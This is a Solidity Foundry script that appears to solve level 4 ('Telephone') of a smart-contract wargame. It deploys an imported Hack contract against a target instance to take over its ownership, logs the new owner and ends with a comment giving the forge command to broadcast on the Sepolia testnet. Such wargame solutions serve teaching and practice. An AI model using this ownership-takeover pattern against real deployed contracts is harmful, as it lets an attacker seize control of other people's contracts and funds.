// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Hack, Telephone} from "../src/level4.sol";

contract Level4Script is Script {
    function run(address instanceAddress) external {
        Telephone target = Telephone(instanceAddress);

        vm.startBroadcast();
        new Hack(Telephone(instanceAddress));
        vm.stopBroadcast();
        address newOwner = target.owner();
        console.log("newOwner: ", newOwner);
    }
}
//forge script script/level4.s.sol:Level4Script --rpc-url $SEPOLIA_RPC_URL --broadcast --account yourkey --sig "run(address)" your instance address
